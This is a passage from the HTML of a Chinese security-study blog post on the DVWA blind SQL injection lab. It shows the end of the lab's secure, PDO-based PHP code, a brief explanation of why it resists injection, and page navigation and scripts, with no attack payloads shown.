class="variable">$data</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">            <span class="comment">// Get results</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$data</span>-&gt;<span class="title function_ invoke__">rowCount</span>()==<span class="number">1</span>){</span><br><span class="line">                <span class="comment">// Feedback for end user</span></span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;'</span>;</span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">else</span> {</span><br><span class="line">                <span class="comment">// User wasn't found, so the page wasn't!</span></span><br><span class="line">                <span class="title function_ invoke__">header</span>(<span class="variable">$_SERVER</span>[ <span class="string">'SERVER_PROTOCOL'</span>].<span class="string">'404 Not Found'</span>);</span><br><span class="line">                <span class="comment">// Feedback for end user</span></span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;'</span>;</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">    <span class="title function_ invoke__">generateSessionToken</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>分析：采用了<code>PDO</code>技术，划清了代码与数据的界限，有效防御 SQL 注入，同时只有返回的查询结果数量为一时，才会成功输出，这样就有效预防了SQL注入攻击，<code>Anti-CSRFtoken</code> 机制的加入了进一步提高了安全性。</p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>李钰璕
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://leeyuxun.github.io/DVWA-SQL-Injection-Blind.html" title="DVWA SQL Injection (Blind)">https://leeyuxun.github.io/DVWA-SQL-Injection-Blind.html</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-cn" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/SQL-Injection/" rel="tag"><i class="fa fa-tag"></i> SQL Injection</a>
+              <a href="/tags/SQLmap/" rel="tag"><i class="fa fa-tag"></i> SQLmap</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/DVWA-SQL-Injection.html" rel="prev" title="DVWA SQL Injection">
+      <i class="fa fa-chevron-left"></i> DVWA SQL Injection
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/DVWA-XSS-Reflected.html" rel="next" title="DVWA XSS (Reflected)">
+      DVWA XSS (Reflected) <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#LOW"><span class="nav-number">2.</span> <span class="nav-text">LOW</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BA%90%E4%BB%A3%E7%A0%81"><span class="nav-number">2.1.</span> <span class="nav-text">源代码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%89%8B%E5%8A%A8%E6%B3%A8%E5%85%A5"><span class="nav-number">2.2.</span> <span class="nav-text">手动注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%A8%E5%85%A5%E5%88%A4%E6%96%AD"><span class="nav-number">2.2.1.</span> <span class="nav-text">注入判断</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%8C%9C%E8%A7%A3%E5%BD%93%E5%89%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BF%A1%E6%81%AF"><span class="nav-number">2.2.2.</span> <span class="nav-text">猜解当前数据库信息</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%8C%9C%E8%A7%A3%E6%95%B0%E6%8D%AE%E5%BA%93%E9%95%BF%E5%BA%A6"><span class="nav-number">2.2.2.1.</span> <span class="nav-text">猜解数据库长度</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%8C%9C%E8%A7%A3%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D"><span class="nav-number">2.2.2.2.</span> <span class="nav-text">猜解数据库名</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%8C%9C%E8%A7%A3%E8%A1%A8%E4%BF%A1%E6%81%AF"><span class="nav-number">2.2.3.</span> <span class="nav-text">猜解表信息</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%8C%9C%E8%A7%A3%E8%A1%A8%E6%95%B0%E7%9B%AE"><span class="nav-number">2.2.3.1.</span> <span class="nav-text">猜解表数目</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%8C%9C%E8%A7%A3%E8%A1%A8%E9%95%BF%E5%BA%A6"><span class="nav-number">2.2.3.2.</span> <span class="nav-text">猜解表长度</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%8C%9C%E8%A7%A3%E8%A1%A8%E5%90%8D"><span class="nav-number">2.2.3.3.</span> <span class="nav-text">猜解表名</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%8C%9C%E8%A7%A3%E5%AD%97%E6%AE%B5%E4%BF%A1%E6%81%AF"><span class="nav-number">2.2.4.</span> <span class="nav-text">猜解字段信息</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%8C%9C%E8%A7%A3%E5%AD%97%E6%AE%B5%E6%95%B0%E9%87%8F"><span class="nav-number">2.2.4.1.</span> <span class="nav-text">猜解字段数量</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%8C%9C%E8%A7%A3%E5%AD%97%E6%AE%B5%E5%90%8D"><span class="nav-number">2.2.4.2.</span> <span class="nav-text">猜解字段名</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%8C%9C%E8%A7%A3%E5%AD%97%E6%AE%B5"><span class="nav-number">2.2.5.</span> <span class="nav-text">猜解字段</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%8C%9C%E8%A7%A3%E5%AD%97%E6%AE%B5%E9%95%BF%E5%BA%A6"><span class="nav-number">2.2.5.1.</span> <span class="nav-text">猜解字段长度</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%8C%9C%E8%A7%A3%E5%AD%97%E6%AE%B5%E5%80%BC"><span class="nav-number">2.2.5.2.</span> <span class="nav-text">猜解字段值</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQLmap%E6%B3%A8%E5%85%A5"><span class="nav-number">2.3.</span> <span class="nav-text">SQLmap注入</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#MEDIUM"><span class="nav-number">3.</span> <span class="nav-text">MEDIUM</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#HIGH"><span class="nav-number">4.</span> <span class="nav-text">HIGH</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#IMPOSSIBLE"><span class="nav-number">5.</span> <span class="nav-text">IMPOSSIBLE</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="李钰璕"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">李钰璕</p>
+  <div class="site-description" itemprop="description">安全学习笔记</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">89</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">17</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">115</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/Leeyuxun" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Leeyuxun" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i></a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:leeyuxun@163.com" title="E-Mail → mailto:leeyuxun@163.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i></a>
+      </span>
+  </div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        <!--
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">李钰璕</span>
+</div>
+-->
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/pangu@4/dist/browser/pangu.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+      
+
+<script>
+  if (typeof MathJax === 'undefined') {
+    window.MathJax = {
+      loader: {
+          load: ['[tex]/mhchem'],
+        source: {
+          '[tex]/amsCd': '[tex]/amscd',
+          '[tex]/AMScd': '[tex]/amscd'
+        }
+      },
+      tex: {
+        inlineMath: {'[+]': [['$', '$']]},
+          packages: {'[+]': ['mhchem']},
+        tags: 'ams'
+      },
+      options: {
+        renderActions: {
+          findScript: [10, doc => {
+            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+              const display = !!node.type.match(/; *mode=display/);
+              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+              const text = document.createTextNode('');
+              node.parentNode.replaceChild(text, node);
+              math.start = {node: text, delim: '', n: 0};
+              math.end = {node: text, delim: '', n: 0};
+              doc.math.push(math);
+            });
+          }, '', false],
+          insertedScript: [200, () => {
+            document.querySelectorAll('mjx-container').forEach(node => {
+              let target = node.parentNode;
+              if (target.nodeName.toLowerCase() === 'li') {
+                target.parentNode.classList.add('has-jax');
+              }
+            });
+          }, '', false]
+        }
+      }
+    };
+    (function () {
+      var script = document.createElement('script');
+      script.src = 'true';
+      script.defer = true;
+      document.head.appendChild(script);
+    })();
+  } else {
+    MathJax.startup.document.state(0);
+    MathJax.texReset();
+    MathJax.typeset();
+  }
+</script>
+
+    
+
+  
+
+</body>
+</html>
